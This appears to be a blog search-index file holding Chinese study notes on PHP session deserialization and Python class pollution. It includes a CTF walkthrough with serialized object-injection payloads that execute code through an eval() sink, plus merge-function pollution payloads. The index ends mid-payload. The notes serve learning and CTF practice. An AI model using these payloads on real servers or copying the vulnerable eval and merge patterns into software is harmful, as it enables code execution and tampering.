<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>php的session机制深层解析与利用</title>
    <link href="/2025/10/18/php%E7%9A%84session%E6%9C%BA%E5%88%B6%E6%B7%B1%E5%B1%82%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <url>/2025/10/18/php%E7%9A%84session%E6%9C%BA%E5%88%B6%E6%B7%B1%E5%B1%82%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="示例解析"><a href="#示例解析" class="headerlink" title="示例解析"></a>示例解析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// ini_set(&#x27;display_errors&#x27;, 0);// 关闭错误显示</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<span class="hljs-comment">// 使用php序列化引擎</span><br><span class="hljs-comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);// 使用php序列化引擎</span><br><span class="hljs-comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);// 使用php序列化引擎</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_path&#x27;</span>, <span class="hljs-string">&#x27;./session&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_handler&#x27;</span>, <span class="hljs-string">&#x27;files&#x27;</span>);<br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<span class="hljs-comment">// 设置程序的默认时区为“亚洲/上海”时区</span><br><span class="hljs-comment">// 自 PHP5.1 起，如果使用任何日期或时间函数，有没有在 php.ini 或代码中指定时区，就会抛出一个 E_WARNING 级别的警告</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yeah&quot;</span>;<br><br><span class="hljs-comment">// 设置 session 不需要像 cookie 一样需要一个set_cookie()</span><br><span class="hljs-comment">// session_start();后会进行下面操作</span><br><span class="hljs-comment">// 当浏览器发送的数据包里没有 PHPSESSID 时，浏览器会创建一个新的会话，并且准备好一个空的$_SESSION数组，然后通过响应包发送一个Set-Cookie: PHPSESSID让浏览器存储会话ID</span><br><br><span class="hljs-comment">// 重要：当访问是携带 PHPSESSID 时，PHP会用这个ID在服务器上寻找对应的会话文件，PHP会读取这个文件里的内容，然后反序列化（根据处理器），并用这些数据填充 $_SESSION 这个超全局数组</span><br><br><span class="hljs-comment">// 会话文件名默认为 sess_PHPSESSID</span><br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]);<br><span class="hljs-comment">// $_COOKIE[&#x27;limit&#x27;] = MQ==</span><br></code></pre></td></tr></table></figure><ul><li>以我的理解和推测的话，从<code>$_SESSION</code>获取值的过程的第一步应该是先根据<strong>会话ID</strong>读取数据然后用<em><strong>相应的处理器反序列化</strong></em>得到结果，中间可能有调用<code>unserialize()</code></li><li><code>$_SESSION</code>存储值的过程的最后一步就是用<em><strong>相应处理器序列化</strong></em>后存储到文件里</li><li>每次读取<code>$_SESSION</code>都经过存储，也就是说都经过一次序列化和反序列化</li></ul><h4 id="序列化处理器"><a href="#序列化处理器" class="headerlink" title="序列化处理器"></a>序列化处理器</h4><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><ul><li>存储：<code>SESSION键名|serialize($_SESSION[&#39;键名&#39;])</code><ul><li><code>limit|s:1:&quot;1&quot;;</code></li></ul></li></ul><h5 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h5><ul><li>存储：应该是<code>serialize()</code>直接序列化<code>$_SESSION[]</code>数组<ul><li><code>a:1:&#123;s:5:&quot;limit&quot;;s:1:&quot;1&quot;;&#125;</code></li></ul></li><li><strong>php大于5.5.4的版本中默认使用php_serialize规则</strong>，在此之前使用<em><strong>php</strong></em><ul><li>怎么感觉是php处理器漏洞太容易利用所以换了</li></ul></li></ul><h5 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h5><ul><li>存储：<code>键名的长度对应的ASCII字符＋键名＋经过serialize()序列化后并处理的值</code><ul><li><code>limits:1:&quot;1&quot;;</code></li></ul></li></ul><h3 id="什么是session反序列化"><a href="#什么是session反序列化" class="headerlink" title="什么是session反序列化"></a>什么是session反序列化</h3><ul><li>PHP在&#x3D;&#x3D;session&#x3D;&#x3D;存储和读取的时候，都会有一个序列化和反序列化的过程，在这个过程中就可能引发反序列化漏洞利用</li><li>&#x3D;&#x3D;php.ini&#x3D;&#x3D;中相关配置，以WampServer为例<ul><li><code>session.save_path</code>：设置session的存储路径</li><li><code>session.save_handler</code>：设定用户自定义存储函数，值为<code>files</code>表示以文件方式存储</li><li><code>session.auto_start</code>：指定会话模块是否在请求时启动一个会话，当值为<code>Off</code>的时候，如果两个脚本注册session会话时使用的序列化处理器不同，就会出现安全问题</li><li><code>session.serialize_handler</code>：定义用来序列化&#x2F;反序列化的<em><strong>处理器</strong></em>名字，默认php，处理默认的<em><strong>session序列化引擎</strong></em>php外，还有几种引擎，不同引擎存储方式不同<ul><li><strong>php_binary</strong>、<strong>php</strong>、<strong>php_serialize</strong></li></ul></li></ul></li></ul><h5 id="序列化处理器不同导致的反序列化漏洞"><a href="#序列化处理器不同导致的反序列化漏洞" class="headerlink" title="序列化处理器不同导致的反序列化漏洞"></a>序列化处理器不同导致的反序列化漏洞</h5><ul><li>其实也相当于<code>php</code>处理器的反序列化漏洞，处理器不同貌似也不影响<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php">demo1.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_path&#x27;</span>, <span class="hljs-string">&#x27;./session&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_handler&#x27;</span>, <span class="hljs-string">&#x27;files&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;test3.php&#x27; &gt;gogogo&lt;/a&gt;&quot;</span>;<br><br>demo2.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_path&#x27;</span>, <span class="hljs-string">&#x27;./session&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_handler&#x27;</span>, <span class="hljs-string">&#x27;files&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br>Class demo &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username == <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yes&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br>exp.php<br><span class="hljs-meta">&lt;?php</span><br>Class demo&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">demo</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;|&#x27;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-comment">//|O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</span><br><span class="hljs-comment">// 存储：a:1:&#123;s:8:&quot;username&quot;;s:43:&quot;|O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;</span><br><span class="hljs-comment">// 如果是php存储：username|s:43:&quot;|O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&quot;;</span><br><span class="hljs-comment">//// 没有|：username|s:42:&quot;O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&quot;;，这就就不能触发发序列化</span><br><span class="hljs-comment">// 在使用php引擎解析的的时候，php会以a:1:&#123;s:8:&quot;username&quot;;s:43:&quot;为key，O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;为value，然后对value进行反序列化</span><br><br><span class="hljs-comment">// 需要注意的是会话ID要相同</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="SESSION上传进度"><a href="#SESSION上传进度" class="headerlink" title="SESSION上传进度"></a>SESSION上传进度</h4><ul><li>当<code>session.upload_progress.enabled INI</code>选项开启时，PHP 能够在每一个文件上传时监测上传进度</li><li>这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</li><li>当一个上传在处理中，同时POST一个与&#x3D;&#x3D;INI&#x3D;&#x3D;中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<code>$_SESSION</code>中获得。 </li><li>当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是<code>session.upload_progress.prefix</code>与<code> session.upload_progress.name</code>连接在一起的值</li><li>因此，可以通过POST方法来构造数据传入<code>$_SSEION</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html">```<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#### 题目：Jarvisoj Web</span><br>- 默认为php_serialize而index.php中又使用了php，反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据<br>- 源代码<br>```php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//A webshell is wait for you</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">OowoO</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;sessiontest.php&#x27;</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li>构造字符串获得路径<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>=<span class="hljs-string">&#x27;print_r(dirname(__FILE__));&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">OowoO</span>();<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure></li><li>然后改为：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:27:\&quot;print_r(dirname(__FILE__));\&quot;;&#125;</code></li><li>没有调用创造函数的原因是此时使用php处理引擎</li><li>查文件：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></li><li>分析借鉴：<ul><li><a href="https://blog.csdn.net/dyw_666666/article/details/89371741">Jarvis-OJ WEB 多题writeup-CSDN博客</a></li></ul></li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua">&lt;form action=<span class="hljs-string">&quot;upload.php&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="hljs-string">&quot;ryat&quot;</span> /&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> /&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><p>The key of stored in the session will look like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;upload_progress_ryat&quot;</span>]<br></code></pre></td></tr></table></figure><p><code>ryat</code>的部分可以注入自己的代码，如<code>ryat|序列化字符串</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>原型链-1</title>
    <link href="/2025/10/16/%E5%8E%9F%E5%9E%8B%E9%93%BE-1/"/>
    <url>/2025/10/16/%E5%8E%9F%E5%9E%8B%E9%93%BE-1/</url>
    
    <content type="html"><![CDATA[<h3 id="简析"><a href="#简析" class="headerlink" title="简析"></a>简析</h3><ul><li>根本原理和Nodejs原型链污染的根本原理相同，只不过<code>Nodejs</code>是<em><strong>对键值对的控制</strong></em>来进行污染，而<code>python</code>则是<em><strong>对类属性值的污染</strong></em>，且<strong>只能对类的属性进行污染</strong>而<strong>不能污染类的方法</strong></li></ul><h4 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src,dst</span>):<br><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> src.items():<span class="hljs-comment"># 提取键值。为什么要items()？因为直接src只能得到键，而不能得到值，for k, v in ... 这种语法是 Python 的序列解包 (Sequence Unpacking)。它期望 `in` 后面的对象每次迭代时都能提供一个包含两个元素的序列（比如元组或列表）。</span><br><span class="hljs-comment"># 因此，`(键, 值)` 这种元组形式恰好能被 `k, v` 完美地解包，`k` 对应键，`v` 对应值</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst,<span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br><span class="hljs-comment"># hasattr(object,name):判断对象是否包含对应的属性。这里是在检查 dst 是否定义了 __getitem__ 方法，检查其是否支持通过[]来访问成员</span><br><span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<span class="hljs-comment"># 如果存在dst中k键且v为字典</span><br>merge(v,dst.get(k))<span class="hljs-comment"># 递归调用 merge ，将src中的子字典合并到dst对应的子字典(dst.get(k))中</span><br><span class="hljs-keyword">else</span>:<br>dst[k] = v <span class="hljs-comment"># 赋值或覆盖</span><br><span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst,k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>merge(v,<span class="hljs-built_in">getattr</span>(dst,k))<span class="hljs-comment"># 为什么不能给k键直接赋值一个字典呢？这是为了实现深层合并而不是浅层覆盖，从而避免丢失嵌套的有效信息。而且如果是直接赋值的话肯定就污染不了了。比如同名字典中还有其它键，直接复制就会被覆盖了</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">setattr</span>(dst,k,v)<br></code></pre></td></tr></table></figure><h4 id="污染示例"><a href="#污染示例" class="headerlink" title="污染示例"></a>污染示例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br>instance = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span> : &#123;<span class="hljs-comment"># 指向该实例的原型对象</span><br>        <span class="hljs-string">&quot;__base__&quot;</span> : &#123;<span class="hljs-comment"># 父类</span><br>            <span class="hljs-string">&quot;secret&quot;</span> : <span class="hljs-string">&quot;world&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-comment">#hello</span><br><span class="hljs-built_in">print</span>(instance.secret)<br><span class="hljs-comment">#hello</span><br>merge(payload, instance)<br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-comment">#world</span><br><span class="hljs-built_in">print</span>(instance.secret)<br><span class="hljs-comment">#world</span><br><br>POST提交<br>Content-<span class="hljs-type">Type</span>: application/json<br></code></pre></td></tr></table></figure><h3 id="获取全局变量污染"><a href="#获取全局变量污染" class="headerlink" title="获取全局变量污染"></a>获取全局变量污染</h3><ul><li><code>__init__</code>作为一个类的内置方法，在<strong>没有被重写为函数</strong>的时候，其<em>数据类型</em>会被当作<em><strong>装饰器</strong></em></li><li><em><strong>装饰器的特点</strong></em>：<em><strong>都</strong></em>具有一个<strong>全局属性</strong><code>__globals__</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>():<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> :<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>:<br>name = <span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(demo.__globals__)<br><span class="hljs-comment"># 等同于 </span><br><span class="hljs-built_in">globals</span>() <br><span class="hljs-comment"># 等同于</span><br>A.__init__.__globals__<br>instance = A()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;a&quot;</span>:<span 